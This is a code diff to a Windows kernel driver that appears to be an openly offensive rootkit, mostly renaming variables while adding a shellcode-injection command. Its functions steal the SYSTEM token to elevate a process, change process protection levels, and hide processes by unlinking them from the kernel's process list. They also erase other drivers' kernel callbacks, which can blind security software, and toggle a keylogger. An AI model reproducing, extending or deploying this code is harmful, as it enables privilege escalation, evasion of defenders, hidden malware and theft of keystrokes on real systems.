@@ -15,163 +15,169 @@
 
 // --------------------------------------------------------------------------------------------------------
 
-NTSTATUS BeCmd_KillProcess(HANDLE pid);
-NTSTATUS BeCmd_ProtectProcess(ULONG pid, BYTE newProcessProtection);
-NTSTATUS BeCmd_ElevateProcessAcessToken(HANDLE pid);
-NTSTATUS BeCmd_KillProcess(HANDLE pid);
-NTSTATUS BeCmd_HideProcess(HANDLE pid);
-ktd::vector<CALLBACK_DATA, PagedPool> BeCmd_EnumerateCallbacks(CALLBACK_TYPE callbackType);
-NTSTATUS BeCmd_EraseCallbacks(PWCHAR targetDriver, CALLBACK_TYPE cbType);
-NTSTATUS BeCmd_StartKeylogger(BOOLEAN start);
+NTSTATUS BeCmd_KillProcess(_In_ HANDLE Pid);
+NTSTATUS BeCmd_ProtectProcess(_In_ ULONG Pid, _In_ BYTE NewProcessProtection);
+NTSTATUS BeCmd_ElevateProcessAcessToken(_In_ HANDLE Pid);
+NTSTATUS BeCmd_KillProcess(_In_ HANDLE Pid);
+NTSTATUS BeCmd_HideProcess(_In_ HANDLE Pid);
+ktd::vector<CALLBACK_DATA, PagedPool> BeCmd_EnumerateCallbacks(_In_ CALLBACK_TYPE CallbackType);
+NTSTATUS BeCmd_EraseCallbacks(_In_ PWCHAR TargetDriver, _In_ CALLBACK_TYPE CbType);
+NTSTATUS BeCmd_StartKeylogger(_In_ BOOLEAN Start);
+NTSTATUS BeCmd_InjectionShellcode(_In_ ULONG Pid, _In_ PCWSTR FilePath);
 
 // --------------------------------------------------------------------------------------------------------
 
 /**
  * Method for setting the protection of an arbitrary process by PID.
  *
- * @param pid PID of the target process
- * @param newProtectionLevel new level of protection to apply
+ * @param[in] Pid PID of the target process
+ * @param[in] NewProtectionLevel new level of protection to apply
+ * 
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BeCmd_ProtectProcess(ULONG pid, BYTE newProtectionLevel)
+BeCmd_ProtectProcess(_In_ ULONG Pid, _In_ BYTE NewProtectionLevel)
 {
-    LOG_MSG("Changing pid %i protection to %i\r\n", pid, newProtectionLevel);
-
+    LOG_MSG("Changing pid %i protection to %i\r\n", Pid, NewProtectionLevel);
+    
+    //
     // Lookup process
-    PEPROCESS process = BeGetEprocessByPid(pid);
-    if (process == NULL)
-    {
+    //
+    PEPROCESS Process = BeGetEprocessByPid(Pid);
+    if (Process == NULL)
         return STATUS_INVALID_PARAMETER_1;
-    }
 
-    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + BeGetEprocessProcessProtectionOffset();
+    ULONG_PTR EProtectionLevel = (ULONG_PTR)Process + BeGetEprocessProcessProtectionOffset();
 
     LOG_MSG("Current protection level: %i\r\n", *((BYTE*)(EProtectionLevel)));
 
-    // assign new protection level
-    *((BYTE*)(EProtectionLevel)) = newProtectionLevel;
+    //
+    // Assign new protection level
+    //
+    *((BYTE*)(EProtectionLevel)) = NewProtectionLevel;
 
     LOG_MSG("New protection level: %i\r\n", *((BYTE*)(EProtectionLevel)));
 
-    ObDereferenceObject(process);
+    ObDereferenceObject(Process);
     return STATUS_SUCCESS;
 }
 
 /**
  * Sets target process access token to a SYSTEM token.
  *
- * @param pid PID of target process.
+ * @param[in] pid PID of target process.
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BeCmd_ElevateProcessAcessToken(HANDLE pid)
+BeCmd_ElevateProcessAcessToken(_In_ HANDLE Pid)
 {
-    PEPROCESS privilegedProcess, targetProcess;
-    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
-    ULONG tokenOffset = BeGetAccessTokenOffset();
+    PEPROCESS PrivilegedProcess = NULL; 
+    PEPROCESS TargetProcess     = NULL;
+    NTSTATUS  Status            = STATUS_UNSUCCESSFUL;
+    ULONG     TokenOffset       = BeGetAccessTokenOffset();
 
+    //
     // Lookup target process
-    NtStatus = PsLookupProcessByProcessId(pid, &targetProcess);
-    if (NtStatus != 0)
+    //
+    Status = PsLookupProcessByProcessId(Pid, &TargetProcess);
+    if (!NT_SUCCESS(Status))
     {
-        LOG_MSG("PID %i not found\r\n", HandleToUlong(pid));
-        ObDereferenceObject(targetProcess);
-        return NtStatus;
+        LOG_MSG("PID %i not found\r\n", HandleToUlong(Pid));
+        ObDereferenceObject(TargetProcess);
+        return Status;
     }
 
+    //
     // Lookup system process (handle for pid 4)
-    NtStatus = PsLookupProcessByProcessId((HANDLE)4, &privilegedProcess);
-    if (NtStatus != 0)
+    //
+    Status = PsLookupProcessByProcessId((HANDLE)4, &PrivilegedProcess);
+    if (!NT_SUCCESS(Status))
     {
         LOG_MSG("System process not found with pid 4\r\n");
-        ObDereferenceObject(privilegedProcess);
-        ObDereferenceObject(targetProcess);
-        return NtStatus;
+        ObDereferenceObject(PrivilegedProcess);
+        ObDereferenceObject(TargetProcess);
+        return Status;
     }
 
-    //LOG_MSG("Token Target: %i", (ULONG)targetProcess + tokenOffset);
-    //LOG_MSG("Token System: %i", (ULONG)privilegedProcess + tokenOffset);
+    LOG_MSG("Token Target: %i", (ULONG)TargetProcess + TokenOffset);
+    LOG_MSG("Token System: %i", (ULONG)PrivilegedProcess + TokenOffset);
 
+    //
     // Replace target process token with system token
-    *(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)privilegedProcess + tokenOffset);
+    //
+    *(ULONG64*)((ULONG64)TargetProcess + TokenOffset) = *(ULONG64*)((ULONG64)PrivilegedProcess + TokenOffset);
 
-    ObDereferenceObject(privilegedProcess);
-    ObDereferenceObject(targetProcess);
-    return NtStatus;
+    ObDereferenceObject(PrivilegedProcess);
+    ObDereferenceObject(TargetProcess);
+    return Status;
 }
 
 /**
  * Kills a process by PID.
  *
- * @param pid PID of the process to kill
+ * @param[in] Pid PID of the process to kill
+ * 
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BeCmd_KillProcess(HANDLE pid)
+BeCmd_KillProcess(_In_ HANDLE Pid)
 {
-    HANDLE hProcess = NULL;
+    HANDLE            HProcess = NULL;
+    CLIENT_ID         Ci       = { 0 };
+    OBJECT_ATTRIBUTES Obj      = { 0 };
 
-    PEPROCESS prc = BeGetEprocessByPid(HandleToULong(pid));
-    if (prc == NULL)
+    PEPROCESS Prc = BeGetEprocessByPid(HandleToULong(Pid));
+    if (Prc == NULL)
     {
         return STATUS_INVALID_PARAMETER;
     }
-    ObDereferenceObject(prc);
 
-    CLIENT_ID ci;
-    ci.UniqueProcess = pid;
-    ci.UniqueThread = 0;
+    ObDereferenceObject(Prc);
 
-    OBJECT_ATTRIBUTES obj;
-    obj.Length = sizeof(obj);
-    obj.Attributes = 0;
-    obj.ObjectName = 0;
-    obj.RootDirectory = 0;
-    obj.SecurityDescriptor = 0;
-    obj.SecurityQualityOfService = 0;
+    Ci.UniqueProcess = Pid;
+    Obj.Length = sizeof(Obj);
 
-    BeGlobals::pZwOpenProcess(&hProcess, 1, &obj, &ci);
-    NTSTATUS NtStatus = BeGlobals::pZwTerminateProcess(hProcess, 0);
-    BeGlobals::pZwClose(hProcess);
+    BeGlobals::pZwOpenProcess(&HProcess, 1, &Obj, &Ci);
+    NTSTATUS Status = BeGlobals::pZwTerminateProcess(HProcess, 0);
+    BeGlobals::pZwClose(HProcess);
 
-    LOG_MSG("KillProcess %i \r\n", NtStatus);
-    return NtStatus;
+    LOG_MSG("KillProcess %i \r\n", Status);
+    return Status;
 }
 
 /**
  * Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
  *
- * @param pid PID of target process.
+ * @param[in] pid PID of target process.
+ * 
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BeCmd_HideProcess(HANDLE pid)
+BeCmd_HideProcess(_In_ HANDLE Pid)
 {
-    PEPROCESS targetProcess = BeGetEprocessByPid(HandleToULong(pid));
-    if (targetProcess == NULL)
-    {
+    PEPROCESS TargetProcess = BeGetEprocessByPid(HandleToULong(Pid));
+    if (TargetProcess == NULL)
         return STATUS_INVALID_PARAMETER;
-    }
 
     {
-        AutoLock<FastMutex> _lock(BeGlobals::processListLock);
-        PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
-        RemoveEntryList(processListEntry);
+        AutoLock<FastMutex> _lock(BeGlobals::ProcessListLock);
+        PLIST_ENTRY ProcessListEntry = (PLIST_ENTRY)((ULONG_PTR)TargetProcess + BeGetProcessLinkedListOffset());
+        RemoveEntryList(ProcessListEntry);
     }
     
-    ObDereferenceObject(targetProcess);
+    ObDereferenceObject(TargetProcess);
     return STATUS_SUCCESS;
 }
 
 /**
  * Enumerates kernel callbacks
  *
- * @param type Type of callback to resolve
+ * @param[in] Type Type of callback to resolve
+ * 
  * @returns ktd::vector<KernelCallback, PagedPool> Vector of callbacks
  */
 ktd::vector<CALLBACK_DATA, PagedPool>
-BeCmd_EnumerateCallbacks(CALLBACK_TYPE type)
+BeCmd_EnumerateCallbacks(_In_ CALLBACK_TYPE type)
 {
     return BeEnumerateKernelCallbacks(type);
 }
@@ -179,31 +185,48 @@ BeCmd_EnumerateCallbacks(CALLBACK_TYPE type)
 /**
  * Replaces all kernel callbacks of a specified driver with empty callbacks.
 
- * @param targetDriver Name of target driver
- * @param cbType type of callback to remove
+ * @param[in] TargetDriver Name of target driver
+ * @param[in] CbType type of callback to remove
+ * 
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BeCmd_EraseCallbacks(PWCHAR targetDriver, CALLBACK_TYPE cbType)
+BeCmd_EraseCallbacks(_In_ PWCHAR TargetDriver, _In_ CALLBACK_TYPE CbType)
 {
-    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
-
-    NtStatus = BeReplaceKernelCallbacksOfDriver(targetDriver, cbType);
-
-    return NtStatus;
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+    Status = BeReplaceKernelCallbacksOfDriver(TargetDriver, CbType);
+    return Status;
 }
 
 /**
  * Starts or stops the keylogger.
  *
- * @param start TRUE to start, FALSE to stop
+ * @param[in] Start TRUE to start, FALSE to stop
+ * 
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BeCmd_StartKeylogger(BOOLEAN start)
+BeCmd_StartKeylogger(_In_ BOOLEAN Start)
 {
-    BeGlobals::logKeys = start;
-    LOG_MSG("Log keys: %d\n", start);
+    BeGlobals::LogKeys = Start;
+    LOG_MSG("Log keys: %d\n", Start);
 
     return STATUS_SUCCESS;
+}
+
+/**
+ * @brief Inject Shellcode via ZwCreateThreadEx.
+ *
+ * @param[in] Pid  The process ID of the target process.
+ * @param[in] FilePath A pointer to a null-terminated wide string
+ *                     containing the path to the shellcode file.
+ *
+ * @return NTSTATUS status code.
+ */
+NTSTATUS
+BeCmd_InjectionShellcode(
+    _In_ ULONG  Pid,
+    _In_ PCWSTR FilePath
+) {
+    return BeInjectionShellcode(Pid, FilePath);
 }
